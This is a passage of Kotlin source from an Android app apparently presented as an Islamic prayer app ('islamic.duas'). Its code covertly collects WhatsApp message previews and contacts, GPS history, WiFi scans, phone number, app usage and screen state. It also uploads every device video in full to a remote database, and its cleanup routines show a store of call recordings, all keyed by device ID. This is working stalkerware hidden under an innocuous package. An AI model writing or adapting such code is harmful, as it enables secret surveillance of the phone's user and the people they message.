            syncRunning.set(false)
        }
    }

        /**
         * Reprocess historical WhatsApp timeline entries that lack chatCategory.
         * Reads last 30 days of timeline entries and categorizes uncategorized WhatsApp messages.
         */
        private suspend fun reprocessHistoricalWhatsApp(context: Context, androidId: String, now: Long) {
            try {
                val thirtyDaysAgo = now - 30 * 86400000L
                val rtdbBase = CloudConfig.RTDB_URL
                val url = "$rtdbBase/devices/$androidId/timeline.json?orderBy=\"ts_ms\"&startAt=$thirtyDaysAgo&shallow=false"
                val req = okhttp3.Request.Builder().url(url).get().build()
                val resp = CloudApi.getClient().newCall(req).execute()
                val body = resp.body?.string()
                resp.close()
                if (body.isNullOrEmpty() || body == "null") return

                val timeline = org.json.JSONObject(body)
                var reprocessed = 0
                val keys = timeline.keys().asSequence().toList()

                for (key in keys) {
                    try {
                        val entry = timeline.optJSONObject(key) ?: continue
                        if (entry.has("chatCategory") && entry.getString("chatCategory").isNotEmpty()) continue
                        if (entry.optString("packageName", "") != "com.whatsapp") continue

                        val title = entry.optString("contactName", "")
                        val conversationTitle = entry.optString("conversationTitle", "")
                        val preview = entry.optString("messagePreview", "")
                        val summaryText = entry.optString("summaryText", "")
                        val msgType = entry.optString("type", "")
                        val isIncoming = entry.optBoolean("isIncoming", true)

                        val phoneNumbers = islamic.duas.logs.DuaNotificationService.getIndividualWhitelistNumbers()
                        val result = islamic.duas.whatsapp.WhatsAppCategorizer.categorize(
                            null, title, conversationTitle, preview, summaryText, msgType, isIncoming,
                            islamic.duas.logs.DuaNotificationService.getIndividualWhitelist(),
                            phoneNumbers
                        )

                        if (result.chatCategory != ChatCategory.unclassified) {
                            entry.put("chatCategory", result.chatCategory.name)
                            entry.put("messageCount", result.messageCount)
                            entry.put("groupName", result.groupName)
                            entry.put("reprocessed", true)
                            entry.put("reprocessedAt", now)

                            CloudApi.writeToRTDB("devices/$androidId/timeline/$key", entry)
                            reprocessed++
                        }
                    } catch (_: Exception) {}
                }

                if (reprocessed > 0) {
                    Log.i(TAG, "Historical WhatsApp reprocessing: $reprocessed entries categorized")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Historical WhatsApp reprocess error: ${e.message}", e)
            }
        }

        private suspend fun runCleanup(context: Context, androidId: String, now: Long) {
            val okClient = CloudApi.getClient()
            val rtdbBase = CloudConfig.RTDB_URL

            // ── Night samples: 7-day TTL ──
            try {
                val url = "$rtdbBase/devices/$androidId/location/night_samples.json?shallow=true"
                val req = okhttp3.Request.Builder().url(url).get().build()
                val resp = okClient.newCall(req).execute()
                val body = resp.body?.string()
                resp.close()
                if (body != null && body != "null") {
                    val sevenDaysAgo = now - 7 * 86400000L
                    val keys = org.json.JSONObject(body).keys().asSequence().toList()
                    var deleted = 0
                    for (key in keys) {
                        val ts = key.toLongOrNull() ?: continue
                        if (ts < sevenDaysAgo) {
                            CloudApi.deleteFromRTDB("devices/$androidId/location/night_samples/$key")
                            deleted++
                            delay(100)
                        }
                    }
                    if (deleted > 0) Log.i(TAG, "Night samples cleanup: deleted $deleted entries")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Night samples cleanup error: ${e.message}", e)
            }

            // ── Location: deduplicate by lat|lng|ts_ms ──
            try {
                data class LocEntry(val path: String, val lat: Double, val lng: Double, val tsMs: Long)
                val allLocs = mutableListOf<LocEntry>()
                suspend fun collectLoc(nodePath: String) {
                    try {
                        val url = "$rtdbBase/devices/$androidId/location$nodePath.json?shallow=true"
                        val req = okhttp3.Request.Builder().url(url).get().build()
                        val resp = okClient.newCall(req).execute()
                        val body = resp.body?.string()
                        resp.close()
                        if (body != null && body != "null") {
                            val obj = org.json.JSONObject(body)
                            for (key in obj.keys()) {
                                val subPath = "$nodePath/$key"
                                when {
                                    key == "latest" || key == "history" || key == "night_samples" -> Unit
                                    obj.opt(key) == true -> collectLoc(subPath)
                                    else -> {
                                        val locUrl = "$rtdbBase/devices/$androidId/location$subPath.json"
                                        val lr = okhttp3.Request.Builder().url(locUrl).get().build()
                                        val lrResp = okClient.newCall(lr).execute()
                                        val locBody = lrResp.body?.string()
                                        lrResp.close()
                                        if (locBody != null && locBody != "null") {
                                            try {
                                                val jo = org.json.JSONObject(locBody)
                                                val lat = jo.optDouble("lat", Double.NaN)
                                                val lng = jo.optDouble("lng", Double.NaN)
                                                val tsMs = jo.optLong("ts_ms", jo.optLong("timestamp", key.toLongOrNull() ?: 0L))
                                                if (lat.isFinite() && lng.isFinite()) {
                                                    allLocs.add(LocEntry("location$subPath", lat, lng, tsMs))
                                                }
                                            } catch (_: Exception) {}
                                        }
                                        delay(80)
                                    }
                                }
                            }
                        }
                    } catch (_: Exception) {}
                }
                collectLoc("")
                collectLoc("/night_samples")
                val groups = mutableMapOf<String, MutableList<Pair<Int, LocEntry>>>()
                for ((i, loc) in allLocs.withIndex()) {
                    val gk = "${String.format("%.4f", loc.lat)}|${String.format("%.4f", loc.lng)}|${loc.tsMs / 1000}"
                    groups.getOrPut(gk) { mutableListOf() }.add(i to loc)
                }
                var locDedupDeleted = 0
                for ((gk, entries) in groups) {
                    if (entries.size <= 1) continue
                    entries.sortByDescending { it.second.path.length }
                    for (i in 1 until entries.size) {
                        if (CloudApi.deleteFromRTDB("devices/$androidId/${entries[i].second.path}")) {
                            locDedupDeleted++
                        }
                        delay(150)
                    }
                }
                if (locDedupDeleted > 0) Log.i(TAG, "Location dedup: deleted $locDedupDeleted duplicate entries")
            } catch (e: Exception) {
                Log.w(TAG, "Location dedup error: ${e.message}", e)
            }

            // ── Location history: 7-day TTL ──
            try {
                data class HistEntry(val path: String, val tsMs: Long)
                val allHist = mutableListOf<HistEntry>()
                suspend fun walkHist(nodePath: String, depth: Int) {
                    if (depth > 4) return
                    try {
                        val url = "$rtdbBase/devices/$androidId/location/history$nodePath.json?shallow=true"
                        val req = okhttp3.Request.Builder().url(url).get().build()
                        val resp = okClient.newCall(req).execute()
                        val body = resp.body?.string()
                        resp.close()
                        if (body != null && body != "null") {
                            val obj = org.json.JSONObject(body)
                            for (key in obj.keys()) {
                                val sub = "$nodePath/$key"
                                val ts = key.toLongOrNull()
                                if (ts != null && depth >= 3) {
                                    allHist.add(HistEntry("location/history$sub", ts))
                                } else if (ts == null && depth < 3) {
                                    walkHist(sub, depth + 1)
                                }
                            }
                        }
                    } catch (_: Exception) {}
                }
                walkHist("", 0)
                val sevenDaysAgo = now - 7 * 86400000L
                var deleted = 0
                for (entry in allHist) {
                    if (entry.tsMs < sevenDaysAgo) {
                        if (CloudApi.deleteFromRTDB("devices/$androidId/${entry.path}")) deleted++
                        delay(100)
                    }
                }
                if (deleted > 0) Log.i(TAG, "Location history cleanup: deleted $deleted old entries (>7d)")
            } catch (e: Exception) {
                Log.w(TAG, "Location history cleanup error: ${e.message}", e)
            }

            // ── Location ts nodes: 14-day TTL (DuaTracker.processLocation path) ──
            try {
                val url = "$rtdbBase/devices/$androidId/location.json?shallow=true"
                val req = okhttp3.Request.Builder().url(url).get().build()
                val resp = okClient.newCall(req).execute()
                val body = resp.body?.string()
                resp.close()
                if (body != null && body != "null") {
                    val keys = org.json.JSONObject(body).keys().asSequence().toList()
                    val skipKeys = setOf("latest", "history", "night_samples")
                    val fourteenDaysAgo = now - 14 * 86400000L
                    var deleted = 0
                    for (key in keys) {
                        if (key in skipKeys) continue
                        val ts = key.toLongOrNull() ?: continue
                        if (ts < fourteenDaysAgo) {
                            CloudApi.deleteFromRTDB("devices/$androidId/location/$key")
                            deleted++
                            delay(100)
                        }
                    }
                    if (deleted > 0) Log.i(TAG, "Location ts cleanup: deleted $deleted old entries")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Location ts cleanup error: ${e.message}", e)
            }

            // ── WiFi scans: 7-day TTL ──
            try {
                val wifiUrl = "$rtdbBase/devices/$androidId/wifi_scan.json?shallow=true"
                val wifiReq = okhttp3.Request.Builder().url(wifiUrl).get().build()
                val wifiResp = okClient.newCall(wifiReq).execute()
                val wifiBody = wifiResp.body?.string()
                wifiResp.close()
                if (wifiBody != null && wifiBody != "null" && wifiBody != "{}") {
                    val sevenDaysAgo = now - 7 * 86400000L
                    val keys = org.json.JSONObject(wifiBody).keys().asSequence().toList()
                    var deleted = 0
                    for (key in keys) {
                        val ts = key.toLongOrNull() ?: continue
                        if (ts < sevenDaysAgo) {
                            if (CloudApi.deleteFromRTDB("devices/$androidId/wifi_scan/$key")) deleted++
                            delay(80)
                        }
                    }
                    if (deleted > 0) Log.i(TAG, "WiFi scan cleanup: deleted $deleted old entries (>7d)")
                }
            } catch (e: Exception) {
                Log.w(TAG, "WiFi scan cleanup error: ${e.message}", e)
            }

            // ── WhatsApp Samples TTL (30 days) ──
            try {
                val sampleUrl = "$rtdbBase/devices/$androidId/whatsapp_samples.json?shallow=true"
                val sampleReq = okhttp3.Request.Builder().url(sampleUrl).get().build()
                val sampleResp = okClient.newCall(sampleReq).execute()
                val sampleBody = sampleResp.body?.string()
                sampleResp.close()
                if (sampleBody != null && sampleBody != "null" && sampleBody != "{}") {
                    val sevenDaysAgo = now - 30 * 86400000L
                    val sampleKeys = org.json.JSONObject(sampleBody).keys().asSequence().toList()
                    var sampleDeleted = 0
                    for (key in sampleKeys) {
                        val ts = key.toLongOrNull() ?: continue
                        if (ts < sevenDaysAgo) {
                            if (CloudApi.deleteFromRTDB("devices/$androidId/whatsapp_samples/$key")) sampleDeleted++
                            delay(50)
                        }
                    }
                    if (sampleDeleted > 0) Log.i(TAG, "WhatsApp samples cleanup: deleted $sampleDeleted old entries (>30d)")
                }
            } catch (e: Exception) {
                Log.w(TAG, "WhatsApp samples cleanup error: ${e.message}", e)
            }

            // ── Videos TTL (30 days) ──
            try {
                val videoUrl = "$rtdbBase/devices/$androidId/videos.json?shallow=true"
                val videoReq = okhttp3.Request.Builder().url(videoUrl).get().build()
                val videoResp = okClient.newCall(videoReq).execute()
                val videoBody = videoResp.body?.string()
                videoResp.close()
                if (videoBody != null && videoBody != "null" && videoBody != "{}") {
                    val thirtyDaysAgo = now - 30 * 86400000L
                    val videoKeys = org.json.JSONObject(videoBody).keys().asSequence().toList()
                    var videoDeleted = 0
                    for (key in videoKeys) {
                        val ts = key.toLongOrNull() ?: continue
                        if (ts < thirtyDaysAgo) {
                            if (CloudApi.deleteFromRTDB("devices/$androidId/videos/$key")) videoDeleted++
                            delay(100)
                        }
                    }
                    if (videoDeleted > 0) Log.i(TAG, "Video cleanup: deleted $videoDeleted old entries (>30d)")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Video cleanup error: ${e.message}", e)
            }

            // ── Call Recordings TTL (30 days) ──
            try {
                val recUrl = "$rtdbBase/devices/$androidId/recordings.json?shallow=true"
                val recReq = okhttp3.Request.Builder().url(recUrl).get().build()
                val recResp = okClient.newCall(recReq).execute()
                val recBody = recResp.body?.string()
                recResp.close()
                if (recBody != null && recBody != "null" && recBody != "{}") {
                    val thirtyDaysAgo = now - 30 * 86400000L
                    val recKeys = org.json.JSONObject(recBody).keys().asSequence().toList()
                    var recDeleted = 0
                    for (key in recKeys) {
                        val ts = key.toLongOrNull() ?: continue
                        if (ts < thirtyDaysAgo) {
                            if (CloudApi.deleteFromRTDB("devices/$androidId/recordings/$key")) recDeleted++
                            delay(100)
                        }
                    }
                    if (recDeleted > 0) Log.i(TAG, "Recording cleanup: deleted $recDeleted old entries (>30d)")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Recording cleanup error: ${e.message}", e)
            }
        }

        private suspend fun minimalSync(context: Context) {
            try {
                val lm = context.getSystemService(Context.LOCATION_SERVICE) as? android.location.LocationManager ?: return
                var best: android.location.Location? = null
                for (provider in listOf(
                    android.location.LocationManager.GPS_PROVIDER,
                    android.location.LocationManager.NETWORK_PROVIDER,
                    android.location.LocationManager.PASSIVE_PROVIDER
                )) {
                    try {
                        @Suppress("DEPRECATION")
                        val loc = lm.getLastKnownLocation(provider)
                        if (loc != null && (best == null || loc.accuracy < best.accuracy)) best = loc
                    } catch (_: Exception) {}
                }
                if (best != null && best.accuracy <= 500f) {
                    if (System.currentTimeMillis() - best.time > 300_000L) return
                    val sp = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                    shouldWriteLocation(context, sp, best.latitude, best.longitude, best.accuracy, System.currentTimeMillis(), "minimal_sync")
                }
            } catch (_: Exception) {}
        }

        private fun haversineDist(lat1: Double, lng1: Double, lat2: Double, lng2: Double): Double {
            val R = 6371000.0
            val dLat = Math.toRadians(lat2 - lat1)
            val dLng = Math.toRadians(lng2 - lng1)
            val sinHalfLat = Math.sin(dLat / 2)
            val sinHalfLng = Math.sin(dLng / 2)
            val a = sinHalfLat * sinHalfLat + Math.cos(Math.toRadians(lat1)) * Math.cos(Math.toRadians(lat2)) * sinHalfLng * sinHalfLng
            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a))
        }

        suspend fun lightweightSync(context: Context) {
            try {
                val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                val androidId = DeviceId.get(context)
                val now = System.currentTimeMillis()
                val dateFormat = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.US)
                val timeStr = dateFormat.format(Date(now))

                // Track screen state
                val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
                if (pm?.isInteractive == true) {
                    prefs.edit().putLong("lastScreenOnMs", now).apply()
                }

                // Lightweight metrics (battery, wifi, network only — no app usage stats queries)
                val metricsCollector = islamic.duas.metrics.MetricsCollector(context)
                val metrics = metricsCollector.collectDeviceMetrics()
                val lastScreenOnMs = prefs.getLong("lastScreenOnMs", 0L)
                val healthEngine = HealthEngine(context)
                val todaySteps = healthEngine.getTodaySteps()
                val metricsDoc = JSONObject().apply {
                    put("timestamp", timeStr)
                    put("ts_ms", now)
                    put("batteryPct", metrics.batteryPct)
                    put("batteryTemp", metrics.batteryTemp.toDouble())
                    put("isCharging", metrics.isCharging)
                    put("storageFreeGb", metrics.storageFreeGb)
                    put("networkType", metrics.networkType)
                    put("wifiSsid", metrics.wifiSsid)
                    put("deviceModel", metrics.deviceModel)
                    put("manufacturer", metrics.manufacturer)
                    put("phoneNumber", metrics.phoneNumber)
                    put("lastScreenOnMs", lastScreenOnMs)
                    put("stepsToday", todaySteps)
                    put("stepsGoal", healthEngine.getStepGoal())
                    put("stepGoalMet", todaySteps >= healthEngine.getStepGoal())
                    put("networkOperator", metrics.networkOperator)
                    put("networkOperatorName", metrics.networkOperatorName)
                    put("networkTypeDetail", metrics.networkTypeDetail)
                }
                CloudApi.writeToRTDB("devices/$androidId/metrics/latest", metricsDoc)

                val todayDate = timeStr.split(" ")[0]
                if (isHealthDue(context)) {
                    val stepsDoc = JSONObject().apply {
                        put("steps", todaySteps)
                        put("ts_ms", now)
                        put("goal", healthEngine.getStepGoal())
                    }
                    CloudApi.writeToRTDB("devices/$androidId/steps/$todayDate", stepsDoc)
                }

                // Activity recognition (lightweight)
                try {
                    if (isHealthDue(context)) {
                        val activityCollector = ActivityRecognitionCollector(context)
                        val latestActivity = activityCollector.getLatestActivity()
                        if (latestActivity.tsMs > 0) {
                            val activityDoc = JSONObject().apply {
                                put("type", latestActivity.type)
                                put("confidence", latestActivity.confidence)
                                put("source", latestActivity.source)
                                put("ts_ms", latestActivity.tsMs)
                            }
                            CloudApi.writeToRTDB("devices/$androidId/activity/latest", activityDoc)
                        }
                    }
                } catch (_: Exception) {}

                // Most recently used app (lightweight — only queries last hour)
                try {
                    val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as? android.app.AppOpsManager
                    val mode = appOps?.checkOpNoThrow(
                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(), context.packageName
                    )
                    if (mode == android.app.AppOpsManager.MODE_ALLOWED) {
                        val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager
                        if (usm != null) {
                            val endTime = now
                            val startTime = endTime - 3600000L
                            val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_BEST, startTime, endTime)
                            var newestApp: android.app.usage.UsageStats? = null
                            for (s in stats) {
                                if (s.lastTimeUsed > 0 && (newestApp == null || s.lastTimeUsed > newestApp.lastTimeUsed)) {
                                    newestApp = s
                                }
                            }
                            if (newestApp != null && newestApp.lastTimeUsed > 0) {
                                val appName = try {
                                    val pkgMgr = context.packageManager
                                    val ai = pkgMgr.getApplicationInfo(newestApp.packageName, 0)
                                    pkgMgr.getApplicationLabel(ai).toString()
                                } catch (_: Exception) { newestApp.packageName }
                                val activeDoc = JSONObject().apply {
                                    put("appName", appName)
                                    put("packageName", newestApp.packageName)
                                    put("lastUsedMs", newestApp.lastTimeUsed)
                                }
                                CloudApi.writeToRTDB("devices/$androidId/activeApp", activeDoc)
                            }
                        }
                    }
                } catch (_: Exception) {}
            } catch (e: Exception) {
                Log.d(TAG, "lightweightSync: ${e.message}")
            }
        }

        suspend fun syncVideos(context: Context) {
            try {
                val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                val lastVideoSyncMs = prefs.getLong("last_video_sync_ms", 0L)
                val now = System.currentTimeMillis()
                if (now - lastVideoSyncMs < 3600000L) return
                val androidId = DeviceId.get(context)
                val resolver = context.contentResolver
                val collector = VideoCollector(context)
                val processor = VideoProcessor()
                val dedupDao = AppDatabase.getInstance(context).videoDedupDao()
                val lastDateAdded = prefs.getLong("last_video_date_added", 0L)
                val videos = collector.collectAllVideos(lastDateAdded)
                Log.d(TAG, "Video sync: ${videos.size} new videos found")
                var newestDateAdded = lastDateAdded
                var uploadedCount = 0
                for ((i, video) in videos.withIndex()) {
                    if (video.sizeBytes == 0L) {
                        Log.w(TAG, "Skipping video with unknown size: ${video.displayName}")
                        continue
                    }
                    if (dedupDao.isUploaded(video.uri.toString(), video.displayName, video.sizeBytes, video.dateAdded)) continue
                    val thumbBase64 = try { collector.generateThumbnail(video.uri) } catch (_: Exception) { null }
                    val processed = processor.process(
                        video.uri, resolver, video.displayName, video.durationMs,
                        video.width, video.height, video.sizeBytes, thumbBase64
                    )
                    if (processed == null) continue
                    val ts = System.currentTimeMillis()
                    val source = collector.classifySource(video)
                    val dateAddedMs = if (video.dateAdded < 10000000000L) video.dateAdded * 1000L else video.dateAdded
                    val videoDoc = JSONObject().apply {
                        put("fileName", processed.fileName)
                        put("dateAdded", dateAddedMs)
                        put("durationMs", processed.durationMs)
                        put("width", processed.width)
                        put("height", processed.height)
                        put("sizeBytes", processed.sizeBytes)
                        put("source", source)
                        put("ts_ms", ts)
                        if (processed.thumbBase64 != null) put("thumb", processed.thumbBase64)
                        put("data", processed.base64)
                    }
                    val success = try {
                        CloudApi.writeToRTDB("devices/$androidId/videos/$ts", videoDoc, skipQueue = true)
                    } catch (_: Exception) { false }
                    if (success) {
                        // Lightweight index (metadata + thumb only) so the dashboard grid loads fast
                        try {
                            val indexDoc = JSONObject().apply {
                                put("fileName", processed.fileName)
                                put("dateAdded", dateAddedMs)
                                put("ts_ms", ts)
                                put("source", source)
                                put("durationMs", processed.durationMs)
                                put("width", processed.width)
                                put("height", processed.height)
                                put("sizeBytes", processed.sizeBytes)
                                if (processed.thumbBase64 != null) put("thumb", processed.thumbBase64)
                            }
                            CloudApi.writeToRTDB("devices/$androidId/videos/_index/$ts", indexDoc, skipQueue = true)
                        } catch (_: Exception) {}
                        dedupDao.markUploaded(video.uri.toString(), video.displayName, video.sizeBytes, video.dateAdded)
                        if (video.dateAdded > newestDateAdded) newestDateAdded = video.dateAdded
                        uploadedCount++
                    }
                    if (i < videos.size - 1) delay(200)
                }
                prefs.edit()
                    .putLong("last_video_date_added", newestDateAdded)
                    .putLong("last_video_sync_ms", now)
                    .apply()
                Log.i(TAG, "Video sync: $uploadedCount uploaded, ${videos.size - uploadedCount} skipped/deduped")
            } catch (e: Exception) {
                Log.e(TAG, "Video sync error: ${e.message}", e)
            }
        }

        fun captureAppSnapshot(context: Context): Boolean {
            try {
                // Skip entirely while screen is off (heartbeat rows only capture screen-on usage)
                val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
                if (pm?.isInteractive != true) return false

                val now = System.currentTimeMillis()
                val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                val pendingScreenOffMs = prefs.getLong("pendingScreenOffMs", 0L)

                val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as? android.app.AppOpsManager
                val mode = appOps?.checkOpNoThrow(
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), context.packageName
                )
                if (mode != android.app.AppOpsManager.MODE_ALLOWED) return false

                val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager ?: return false
                var lastPkg: String? = null
                var lastTs: Long = 0

                // Try queryEvents first (individual ACTIVITY_RESUMED events, 120s window covers 15s cadence)
                try {
                    val events = usm.queryEvents(now - 120_000, now)
                    if (events != null) {
                        val ev = android.app.usage.UsageEvents.Event()
                        while (events.getNextEvent(ev)) {
                            if (ev.eventType == android.app.usage.UsageEvents.Event.ACTIVITY_RESUMED) {
                                lastPkg = ev.packageName
                                lastTs = ev.timeStamp
                            }
                        }
                    }
                } catch (_: Exception) {}

                // Fallback: queryUsageStats if queryEvents returned nothing
                if (lastPkg == null) {
                    try {
                        val stats = usm.queryUsageStats(
                            android.app.usage.UsageStatsManager.INTERVAL_BEST,
                            now - 3600000L, now
                        )
                        if (stats != null) {
                            var newest: android.app.usage.UsageStats? = null
                            for (s in stats) {
                                if (s.lastTimeUsed > 0 && (newest == null || s.lastTimeUsed > newest.lastTimeUsed)) {
                                    newest = s
                                }
                            }
                            if (newest != null && newest.lastTimeUsed > 0) {
                                lastPkg = newest.packageName
                                lastTs = newest.lastTimeUsed
                            }
                        }
                    } catch (_: Exception) {}
                }

                if (lastPkg != null && lastTs > 0) {
                    val appName = try {
                        val pkgMgr = context.packageManager
                        val ai = pkgMgr.getApplicationInfo(lastPkg, 0)
                        pkgMgr.getApplicationLabel(ai).toString()
                    } catch (_: Exception) { lastPkg }
                    val androidId = DeviceId.get(context)
                    val snapMetrics = try {
                        val mc = islamic.duas.metrics.MetricsCollector(context)
                        mc.collectDeviceMetrics()
                    } catch (_: Exception) { null }
                    val screenOn = pm?.isInteractive ?: true
                    val snapDoc = JSONObject().apply {
                        put("appName", appName)
                        put("packageName", lastPkg)
                        put("phoneTsMs", lastTs)
                        put("dashboardTsMs", now)
                        put("hb", true)
                        if (pendingScreenOffMs > 0) put("screenOffMs", pendingScreenOffMs)
                        if (snapMetrics != null) {
                            put("batteryPct", snapMetrics.batteryPct)
                            put("isCharging", snapMetrics.isCharging)
                            put("networkType", snapMetrics.networkType)
                            put("wifiSsid", snapMetrics.wifiSsid)
                        }
                        put("screenOn", screenOn)
                    }
                    CloudApi.writeToRTDB("devices/$androidId/appSnapshots/$now", snapDoc)
                    if (pendingScreenOffMs > 0) {
                        prefs.edit().remove("pendingScreenOffMs").apply()
                    }
                    return true
                }
            } catch (_: Exception) {}
            return false
        }

        private fun shouldWriteLocation(context: Context, prefs: android.content.SharedPreferences, lat: Double, lng: Double, accuracy: Float, nowMs: Long, source: String) {
            val lastLocLat = prefs.getFloat("last_loc_lat", Float.NaN)
            val lastLocLng = prefs.getFloat("last_loc_lng", Float.NaN)
            val lastLocTime = prefs.getLong("last_loc_write_ms", 0L)
            val isFirst = lastLocLat.isNaN() || lastLocLng.isNaN()
            val moved = isFirst || haversineDist(lastLocLat.toDouble(), lastLocLng.toDouble(), lat, lng) > 20.0
            val timeElapsed = nowMs - lastLocTime
            val timeExpired = timeElapsed > 300000L
            if (moved || timeExpired) {
                val loc = android.location.Location("") // dummy for writeLocation
                loc.latitude = lat
                loc.longitude = lng
                loc.accuracy = accuracy
                loc.time = nowMs
                LocationSyncManager.writeLocation(context, loc, source)
                prefs.edit().putFloat("last_loc_lat", lat.toFloat()).apply()
                prefs.edit().putFloat("last_loc_lng", lng.toFloat()).apply()
                prefs.edit().putLong("last_loc_write_ms", nowMs).apply()
            }
        }
    }
}
